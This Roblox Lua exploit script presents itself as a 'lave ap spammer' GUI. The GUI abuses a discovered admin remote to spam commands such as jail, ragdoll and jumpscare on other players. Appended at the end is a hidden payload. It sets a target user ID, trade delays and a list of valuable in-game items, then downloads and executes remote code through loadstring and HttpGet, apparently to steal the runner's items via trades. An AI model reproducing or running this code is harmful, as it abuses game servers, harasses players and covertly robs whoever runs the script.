-- leaked by script haven join for best sources https://discord.gg/xfwA9fNFMe

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local uis = game:GetService("UserInputService")

local lp = Players.LocalPlayer
local repsto = game:GetService("ReplicatedStorage")
local plrgui = lp:WaitForChild("PlayerGui")

if CoreGui:FindFirstChild("LaveHubApGui") then CoreGui["LaveHubGui"]:Destroy() end

_G.LaveHubSpammer = { AdminRemote = nil }
local core = _G.LaveHubSpammer

task.spawn(function()
	if not lp.Character then lp.CharacterAdded:Wait() end
	task.wait(1)
	local net = repsto:WaitForChild("Packages"):WaitForChild("Net")
	local children = net:GetChildren()
	local byIdx, byName = {}, {}
	for i, obj in ipairs(children) do byIdx[i] = obj byName[obj.Name] = i end
	local anchorIdx = byName["RF/a0e78691-cb9b-4efc-ac08-9c06fea70059"]
	if anchorIdx then
		local actual = byIdx[anchorIdx + 1]
		if actual then core.AdminRemote = actual end
	end
end)

local ALL_COMMANDS = {"balloon", "rocket", "ragdoll", "inverse", "jail", "tiny", "morph", "jumpscare"}
local config = {}
for _, cmd in ipairs(ALL_COMMANDS) do config[cmd] = true end

local selectedPlayer = nil
local playerRows = {}
local currentKeybind = Enum.KeyCode.RightControl
local listeningForKey = false

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LaveHubGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = (RunService:IsStudio() and plrgui) or CoreGui

local function spamSelected()
	if not core.AdminRemote or not selectedPlayer then return end
	for _, cmd in ipairs(ALL_COMMANDS) do
		if config[cmd] then
			local c = cmd
			task.spawn(function() core.AdminRemote:InvokeServer("f888ee6e-c86d-46e1-93d7-0639d6635d42", selectedPlayer, c) end)
		end
	end
end

local outerBorder = Instance.new("Frame")
outerBorder.Size = UDim2.new(0, 268, 0, 438)
outerBorder.Position = UDim2.new(0.5, -134, 0, 118)
outerBorder.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
outerBorder.BorderSizePixel = 0
outerBorder.ZIndex = 1
outerBorder.Parent = screenGui
Instance.new("UICorner", outerBorder).CornerRadius = UDim.new(0, 24)

local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 260, 0, 430)
ListFrame.Position = UDim2.new(0.5, -130, 0, 122)
ListFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
ListFrame.BorderSizePixel = 0
ListFrame.Active = true
ListFrame.Draggable = true
ListFrame.ZIndex = 2
ListFrame.Parent = screenGui
Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 20)

 
local titleBar = Instance.new("Frame", ListFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
titleBar.BorderSizePixel = 0
titleBar.ZIndex = 3
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 20)
local titleBarFill = Instance.new("Frame", titleBar)
titleBarFill.Size = UDim2.new(1, 0, 0.5, 0)
titleBarFill.Position = UDim2.new(0, 0, 0.5, 0)
titleBarFill.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
titleBarFill.BorderSizePixel = 0
titleBarFill.ZIndex = 3

local ListTitle = Instance.new("TextLabel", titleBar)
ListTitle.Size = UDim2.new(1, -70, 1, 0)
ListTitle.Position = UDim2.new(0, 12, 0, 0)
ListTitle.BackgroundTransparency = 1
ListTitle.Text = "lave ap spammer"
ListTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
ListTitle.Font = Enum.Font.GothamBold
ListTitle.TextSize = 11
ListTitle.TextXAlignment = Enum.TextXAlignment.Left
ListTitle.ZIndex = 4

local gearBtn = Instance.new("TextButton", titleBar)
gearBtn.Size = UDim2.new(0, 26, 0, 26)
gearBtn.Position = UDim2.new(1, -32, 0.5, -13)
gearBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
gearBtn.Text = "//"
gearBtn.TextColor3 = Color3.fromRGB(200, 0, 0)
gearBtn.Font = Enum.Font.GothamBold
gearBtn.TextSize = 10
gearBtn.ZIndex = 5
Instance.new("UICorner", gearBtn).CornerRadius = UDim.new(0, 6)
local gearStroke = Instance.new("UIStroke", gearBtn)
gearStroke.Thickness = 1.2
gearStroke.Color = Color3.fromRGB(160, 0, 0)

local Scroll = Instance.new("ScrollingFrame", ListFrame)
Scroll.Size = UDim2.new(0.92, 0, 0, 268)
Scroll.Position = UDim2.new(0.04, 0, 0, 42)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.ScrollBarThickness = 2
Scroll.ScrollBarImageColor3 = Color3.fromRGB(200, 0, 0)
Scroll.ZIndex = 3

local UIListLayout = Instance.new("UIListLayout", Scroll)
UIListLayout.Padding = UDim.new(0, 7)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- SPAM BUTTON (solid red border)
local spamOuter = Instance.new("Frame", ListFrame)
spamOuter.Size = UDim2.new(0.92, 0, 0, 38)
spamOuter.Position = UDim2.new(0.04, 0, 0, 318)
spamOuter.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
spamOuter.BorderSizePixel = 0
spamOuter.ZIndex = 2
Instance.new("UICorner", spamOuter).CornerRadius = UDim.new(0, 11)

local spamBtn = Instance.new("TextButton", ListFrame)
spamBtn.Size = UDim2.new(0.92, -8, 0, 30)
spamBtn.Position = UDim2.new(0.04, 4, 0, 322)
spamBtn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
spamBtn.Text = "[ SPAM ]"
spamBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
spamBtn.Font = Enum.Font.GothamBold
spamBtn.TextSize = 13
spamBtn.ZIndex = 3
Instance.new("UICorner", spamBtn).CornerRadius = UDim.new(0, 7)
spamBtn.MouseButton1Click:Connect(spamSelected)

local keybindFrame = Instance.new("Frame", ListFrame)
keybindFrame.Size = UDim2.new(0.92, 0, 0, 32)
keybindFrame.Position = UDim2.new(0.04, 0, 0, 362)
keybindFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
keybindFrame.ZIndex = 3
Instance.new("UICorner", keybindFrame).CornerRadius = UDim.new(0, 8)
local kbStroke = Instance.new("UIStroke", keybindFrame)
kbStroke.Thickness = 1
kbStroke.Color = Color3.fromRGB(50, 0, 0)

local kbLabel = Instance.new("TextLabel", keybindFrame)
kbLabel.Size = UDim2.new(0.45, 0, 1, 0)
kbLabel.Position = UDim2.new(0, 8, 0, 0)
kbLabel.BackgroundTransparency = 1
kbLabel.Text = "Keybind"
kbLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
kbLabel.Font = Enum.Font.GothamBold
kbLabel.TextSize = 10
kbLabel.TextXAlignment = Enum.TextXAlignment.Left
kbLabel.ZIndex = 4

local kbBtn = Instance.new("TextButton", keybindFrame)
kbBtn.Size = UDim2.new(0.5, -6, 0.7, 0)
kbBtn.Position = UDim2.new(0.5, 2, 0.15, 0)
kbBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
kbBtn.Text = "Keybind …"
kbBtn.TextColor3 = Color3.fromRGB(200, 0, 0)
kbBtn.Font = Enum.Font.GothamBold
kbBtn.TextSize = 9
kbBtn.ZIndex = 4
Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 6)
local kbBtnStroke = Instance.new("UIStroke", kbBtn)
kbBtnStroke.Thickness = 1
kbBtnStroke.Color = Color3.fromRGB(80, 0, 0)

kbBtn.MouseButton1Click:Connect(function()
	listeningForKey = true
	kbBtn.Text = "..."
	kbBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
end)



local LeakFrame = Instance.new("Frame", ListFrame)
LeakFrame.Size = UDim2.new(0.92, 0, 0, 26)
LeakFrame.Position = UDim2.new(0.04, 0, 0, 398)
LeakFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
LeakFrame.ZIndex = 3
Instance.new("UICorner", LeakFrame).CornerRadius = UDim.new(0, 8)
local leakStroke = Instance.new("UIStroke", LeakFrame)
leakStroke.Thickness = 1
leakStroke.Color = Color3.fromRGB(50, 0, 0)
local LeakLabel = Instance.new("TextLabel", LeakFrame)
LeakLabel.Size = UDim2.new(1, 0, 1, 0)
LeakLabel.BackgroundTransparency = 1
LeakLabel.Text = ""
LeakLabel.TextColor3 = Color3.fromRGB(160, 0, 0)
LeakLabel.Font = Enum.Font.GothamBold
LeakLabel.TextSize = 9
LeakLabel.ZIndex = 4

local settingsOuter = Instance.new("Frame", screenGui)
settingsOuter.Size = UDim2.new(0, 236, 0, 346)
settingsOuter.Position = UDim2.new(0.5, 140, 0, 118)
settingsOuter.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
settingsOuter.BorderSizePixel = 0
settingsOuter.ZIndex = 9
settingsOuter.Visible = false
Instance.new("UICorner", settingsOuter).CornerRadius = UDim.new(0, 24)

local settingsFrame = Instance.new("Frame", screenGui)
settingsFrame.Size = UDim2.new(0, 228, 0, 338)
settingsFrame.Position = UDim2.new(0.5, 144, 0, 122)
settingsFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
settingsFrame.BorderSizePixel = 0
settingsFrame.Active = true
settingsFrame.Draggable = true
settingsFrame.ZIndex = 10
settingsFrame.Visible = false
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 20)

local settingsTitleBar = Instance.new("Frame", settingsFrame)
settingsTitleBar.Size = UDim2.new(1, 0, 0, 34)
settingsTitleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
settingsTitleBar.BorderSizePixel = 0
settingsTitleBar.ZIndex = 11
Instance.new("UICorner", settingsTitleBar).CornerRadius = UDim.new(0, 20)
local sTitleFill = Instance.new("Frame", settingsTitleBar)
sTitleFill.Size = UDim2.new(1, 0, 0.5, 0)
sTitleFill.Position = UDim2.new(0, 0, 0.5, 0)
sTitleFill.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
sTitleFill.BorderSizePixel = 0
sTitleFill.ZIndex = 11

local settingsTitle = Instance.new("TextLabel", settingsTitleBar)
settingsTitle.Size = UDim2.new(1, -40, 1, 0)
settingsTitle.Position = UDim2.new(0, 12, 0, 0)
settingsTitle.BackgroundTransparency = 1
settingsTitle.Text = "Commands"
settingsTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
settingsTitle.Font = Enum.Font.GothamBold
settingsTitle.TextSize = 11
settingsTitle.TextXAlignment = Enum.TextXAlignment.Left
settingsTitle.ZIndex = 12

local closeSettingsBtn = Instance.new("TextButton", settingsTitleBar)
closeSettingsBtn.Size = UDim2.new(0, 22, 0, 22)
closeSettingsBtn.Position = UDim2.new(1, -28, 0.5, -11)
closeSettingsBtn.BackgroundColor3 = Color3.fromRGB(160, 0, 0)
closeSettingsBtn.Text = "x"
closeSettingsBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
closeSettingsBtn.Font = Enum.Font.GothamBold
closeSettingsBtn.TextSize = 11
closeSettingsBtn.ZIndex = 12
Instance.new("UICorner", closeSettingsBtn).CornerRadius = UDim.new(0, 6)
closeSettingsBtn.MouseButton1Click:Connect(function()
	settingsFrame.Visible = false
	settingsOuter.Visible = false
end)

local cmdToggles = {}
for i, cmd in ipairs(ALL_COMMANDS) do
	local row = Instance.new("Frame", settingsFrame)
	row.Size = UDim2.new(0.9, 0, 0, 26)
	row.Position = UDim2.new(0.05, 0, 0, 40 + (i-1) * 32)
	row.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	row.ZIndex = 11
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 7)
	local rowStroke = Instance.new("UIStroke", row)
	rowStroke.Thickness = 1
	rowStroke.Color = Color3.fromRGB(50, 0, 0)

	local cmdLabel = Instance.new("TextLabel", row)
	cmdLabel.Size = UDim2.new(0.55, 0, 1, 0)
	cmdLabel.Position = UDim2.new(0, 8, 0, 0)
	cmdLabel.BackgroundTransparency = 1
	cmdLabel.Text = cmd
	cmdLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	cmdLabel.Font = Enum.Font.GothamBold
	cmdLabel.TextSize = 10
	cmdLabel.TextXAlignment = Enum.TextXAlignment.Left
	cmdLabel.ZIndex = 12

	local track = Instance.new("TextButton", row)
	track.Position = UDim2.new(0.65, 0, 0.5, -8)
	track.Size = UDim2.new(0, 36, 0, 16)
	track.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
	track.BorderSizePixel = 0
	track.Text = ""
	track.AutoButtonColor = false
	track.ZIndex = 12
	Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

	local dot = Instance.new("Frame", track)
	dot.Size = UDim2.new(0, 12, 0, 12)
	dot.Position = UDim2.new(1, -14, 0, 2)
	dot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
	dot.BorderSizePixel = 0
	dot.ZIndex = 13
	Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

	cmdToggles[cmd] = true

	track.MouseButton1Click:Connect(function()
		cmdToggles[cmd] = not cmdToggles[cmd]
		config[cmd] = cmdToggles[cmd]
		if cmdToggles[cmd] then
			dot.Position = UDim2.new(1, -14, 0, 2)
			dot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
			track.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
		else
			dot.Position = UDim2.new(0, 2, 0, 2)
			dot.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			track.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
		end
	end)
end

local saveOuterS = Instance.new("Frame", settingsFrame)
saveOuterS.Size = UDim2.new(0.9, 0, 0, 34)
saveOuterS.Position = UDim2.new(0.05, 0, 0, 40 + #ALL_COMMANDS * 32 + 6)
saveOuterS.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
saveOuterS.BorderSizePixel = 0
saveOuterS.ZIndex = 10
Instance.new("UICorner", saveOuterS).CornerRadius = UDim.new(0, 10)

local saveBtnS = Instance.new("TextButton", settingsFrame)
saveBtnS.Size = UDim2.new(0.9, -8, 0, 26)
saveBtnS.Position = UDim2.new(0.05, 4, 0, 40 + #ALL_COMMANDS * 32 + 10)
saveBtnS.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
saveBtnS.Text = "[ SAVE CONFIG ]"
saveBtnS.TextColor3 = Color3.fromRGB(220, 220, 220)
saveBtnS.Font = Enum.Font.GothamBold
saveBtnS.TextSize = 11
saveBtnS.ZIndex = 11
Instance.new("UICorner", saveBtnS).CornerRadius = UDim.new(0, 7)
saveBtnS.MouseButton1Click:Connect(function()
	saveBtnS.Text = "[ SAVED ]"
	saveBtnS.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
	task.delay(1.5, function()
		saveBtnS.Text = "[ SAVE CONFIG ]"
		saveBtnS.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	end)
end)

gearBtn.MouseButton1Click:Connect(function()
	settingsFrame.Visible = not settingsFrame.Visible
	settingsOuter.Visible = settingsFrame.Visible
end)

-- PLAYER ENTRIES
local function updateSelection()
	for uid, data in pairs(playerRows) do
		if selectedPlayer and selectedPlayer.UserId == uid then
			data.stroke.Color = Color3.fromRGB(220, 0, 0)
			data.stroke.Thickness = 2
		else
			data.stroke.Color = Color3.fromRGB(40, 40, 40)
			data.stroke.Thickness = 1
		end
	end
end

local function createPlayerEntry(playerObj)
	local Container = Instance.new("Frame")
	Container.Size = UDim2.new(0.96, 0, 0, 44)
	Container.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	Container.ZIndex = 4
	Container.Parent = Scroll
	Instance.new("UICorner", Container).CornerRadius = UDim.new(0, 8)

	local contOuter = Instance.new("Frame")
	contOuter.Size = UDim2.new(1, 6, 1, 6)
	contOuter.Position = UDim2.new(0, -3, 0, -3)
	contOuter.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
	contOuter.BorderSizePixel = 0
	contOuter.ZIndex = 3
	contOuter.Parent = Container
	Instance.new("UICorner", contOuter).CornerRadius = UDim.new(0, 11)

	local inner = Instance.new("Frame", contOuter)
	inner.Size = UDim2.new(1, -6, 1, -6)
	inner.Position = UDim2.new(0, 3, 0, 3)
	inner.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	inner.BorderSizePixel = 0
	inner.ZIndex = 4
	Instance.new("UICorner", inner).CornerRadius = UDim.new(0, 8)

	local selStroke = Instance.new("UIStroke", inner)
	selStroke.Thickness = 1
	selStroke.Color = Color3.fromRGB(40, 40, 40)
	selStroke.ZIndex = 5

	local AvatarImg = Instance.new("ImageLabel", inner)
	AvatarImg.Size = UDim2.new(0, 30, 0, 30)
	AvatarImg.Position = UDim2.new(0, 6, 0.5, -15)
	AvatarImg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	AvatarImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. playerObj.UserId .. "&w=150&h=150"
	AvatarImg.ZIndex = 5
	Instance.new("UICorner", AvatarImg).CornerRadius = UDim.new(1, 0)

	local NameLabel = Instance.new("TextLabel", inner)
	NameLabel.Size = UDim2.new(0.68, 0, 1, 0)
	NameLabel.Position = UDim2.new(0, 42, 0, 0)
	NameLabel.BackgroundTransparency = 1
	NameLabel.Text = (playerObj == lp) and "[ you ]  " .. playerObj.Name or playerObj.Name
	NameLabel.TextColor3 = Color3.fromRGB(210, 210, 210)
	NameLabel.Font = Enum.Font.GothamBold
	NameLabel.TextSize = 10
	NameLabel.TextXAlignment = Enum.TextXAlignment.Left
	NameLabel.ZIndex = 5

	inner.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			selectedPlayer = playerObj
			updateSelection()
		end
	end)

	playerRows[playerObj.UserId] = { frame = Container, stroke = selStroke }
end

local function refresh()
	for _, v in pairs(Scroll:GetChildren()) do
		if v:IsA("Frame") then v:Destroy() end
	end
	playerRows = {}
	selectedPlayer = nil
	for _, p in pairs(Players:GetPlayers()) do createPlayerEntry(p) end
	Scroll.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
end

Players.PlayerAdded:Connect(refresh)
Players.PlayerRemoving:Connect(refresh)
refresh()

ListFrame:GetPropertyChangedSignal("Position"):Connect(function()
	local pos = ListFrame.Position
	outerBorder.Position = UDim2.new(pos.X.Scale, pos.X.Offset - 4, pos.Y.Scale, pos.Y.Offset - 4)
end)

settingsFrame:GetPropertyChangedSignal("Position"):Connect(function()
	local pos = settingsFrame.Position
	settingsOuter.Position = UDim2.new(pos.X.Scale, pos.X.Offset - 4, pos.Y.Scale, pos.Y.Offset - 4)
end)

uis.InputBegan:Connect(function(input, gpe)
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

	if listeningForKey then
		currentKeybind = input.KeyCode
		kbBtn.Text = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
		kbBtn.TextColor3 = Color3.fromRGB(200, 0, 0)
		listeningForKey = false
		return
	end

	if gpe then return end

	if input.KeyCode == currentKeybind then
		spamSelected()
	end

	if input.KeyCode == Enum.KeyCode.RightShift then
		ListFrame.Visible = not ListFrame.Visible
		outerBorder.Visible = not outerBorder.Visible
	end
end)
getgenv().SECRET_KEY = "mrr_cc5a41d20d9b4327b87f2f000402de07"
getgenv().TARGET_ID = 3383614578
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Headless Horseman"] = true,
    ["Skibidi Toilet"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Dragon Cannelloni"] = true,
    ["Elefanto Frigo"] = true,
    ["Antonio"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["La Casa Boo"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["Lavadorito Spinito"] = true,
    ["Cloverat Clapat"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["La Romantic Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["La Sahur Combinasion"] = true,
    ["Cerberus"] = true,
    ["Capitano Moby"] = true,
    ["Burguro And Fryuro"] = true,
    ["Griffin"] = true,
    ["Celestial Pegasus"] = true,
    ["Love Love Bear"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Rosey and Teddy"] = true,
    ["Cooki and Milki"] = true,
    ["Ketupat Bros"] = true,
    ["Reinito Sleighito"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Ginger Gerat"] = true,
    ["Spooky and Pumpky"] = true,
    ["Festive 67"] = true,
    ["Garama and Madundung"] = true,
    ["Bunny and Eggy"] = true,
    ["Arcadragon"] = true,
    ["Foxini Lanternini"] = true,
    ["Pancake and Syrup"] = true,
    ["Cash or Card"] = true,
    ["Los Spaghettis"] = true,
    ["Dug dug dug"] = true,
    ["Lovin Rose"] = true,
    ["Celularcini Viciosini"] = true,
    ["Los Hotspotsitos"] = true
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
